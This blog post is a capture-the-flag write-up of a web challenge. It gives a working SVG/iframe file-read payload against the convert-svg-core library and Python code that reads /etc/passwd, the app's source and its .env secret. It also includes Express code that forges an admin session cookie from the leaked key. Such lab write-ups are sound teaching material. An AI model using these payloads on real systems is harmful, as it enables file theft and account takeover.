---
layout: post
title:  "HTB CTF - Mutation Lab writeup"
date:   2022-05-20 08:30:00
tags: ["ctf-writeup"]
author: "Alex Ward"
---

This was a "blind" web challenge, in that no source was provided.

After initially dismissing this challenge because it was "blind"
(no source code), I revisited it as the remaining challenges got harder.

The site greets you with a login portal where you can register a user.

<!-- more -->

![](https://i.postimg.cc/XJKRJKgQ/Pasted-image-20220518220842.png)

After creating a user and logging in, the main application allows you
to play with some cells and "tadpoles" and export them as images.

![](https://i.postimg.cc/FsHMrLkV/Pasted-image-20220518221051.png)

The bottom of the page shows the target

> Only lab admin is allowed to view the confidential records

Checking dev tools, to see what the requests to generate the images
looked like, revealed an application error. The generation of the "tadpoles"
image sent two requests, but one didn't contain any data:

```json
{"svg":null}
```

This request had a stack trace as the response:

```plain
TypeError: Cannot read properties of null (reading 'indexOf')  
    at Converter.[convert] (/app/node_modules/convert-svg-core/src/Converter.js:191:25)  
    at Converter.convert (/app/node_modules/convert-svg-core/src/Converter.js:114:40)  
    at API.convert (/app/node_modules/convert-svg-core/src/API.js:80:32)  
    at /app/routes/index.js:61:21
```

A quick web search to confirm this is an attack vector, and we see a directory
traversal vulnerability in `convert-svg-core`:
https://snyk.io/vuln/npm:convert-svg-core. Synk even provided a proof of concept snippet!

Writing some Python code to confirm the vulnerability:

```python
import webbrowser
import requests

REMOTE = "http://HOST:PORT"
PAYLOAD = """
<svg-dummy></svg-dummy>
<iframe src="file:///etc/passwd"" width="100%" height="1000px"></iframe>
<svg viewBox="0 0 0 0" height="1000" width="1000" xmlns="http://www.w3.org/2000/svg">
  <text></text>
</svg>
"""

res = requests.post(
    f"{REMOTE}/api/export",
    json={
        "svg": PAYLOAD
    })

image = f"{REMOTE}{res.json()['png']}"

print(image)
webbrowser.open_new_tab(image)
```

![](https://i.postimg.cc/90JsPWK9/Pasted-image-20220518222217.png)

For some time I was stuck. I tried `/flag`, `/flag.txt`, `/secret.txt`,
but no luck. I wasn't sure how I could extract any information without
knowing a little about the file structure.

After some searching, one site suggested `/proc/self/envion` to get
the current processes environment variables. It came up empty.

In my own shell I tried `/proc/self/<TAB>` and saw `cwd`! A way to
access the current process's working directory!

![](https://i.postimg.cc/kGnktV19/Pasted-image-20220518222651.png)

> 💭 (In hindsight, I had the original error message that told me
> exactly where the app was - but I like this way better)

```plain
/proc/self/cwd/index.js
/proc/self/cwd/routes/index.js
/proc/self/cwd/middleware/AuthMiddleware.js
```

These files told me a few things...

- It was an express app
- Logging in set the username on a "session"
- The session was [cookie-session](http://expressjs.com/en/resources/middleware/cookie-session.html)
- The `AuthMiddleware` only checked for the existence of a "username" property

The last piece of the puzzle was an environment variable "SESSION_SECRET_KEY",
which was conveniently loaded from `/app/.env`.

Knowing the secret key meant that I could generate my own session cookies with
any username I wanted.

But first, I suspected the admin username was just "admin", but I wanted to be
sure, so I sent a request to register a user with that name:

```python
import requests

REMOTE = "http://139.59.163.221:30651/api/register"

res = requests.post(REMOTE,
    json={
        "username": "admin",
        "password": "aaa",
    }
)

print(res.json())
# {'message': 'This UUID is already registered!'}
```

To generate the cookie, the best approach I could think was just starting an
express server that sets the cookie.

```js
var cookieSession = require('cookie-session')
var express = require('express')

var app = express()


app.use(cookieSession({
  name: 'session',
  keys: ['<SECRET>']
}))

app.get('/', function (req, res, next) {
  req.session.username = "admin"

  res.end("got 'em")
})

app.listen(3000)
```

I did some browser shuffling -> open http://localhost:3000 -> get the cookie
-> open dev tools -> manually change the cookie host to the target host ->
visit target site -> get logged in as admin!

![](https://i.postimg.cc/h4sFRrvG/Pasted-image-20220518224229.png)
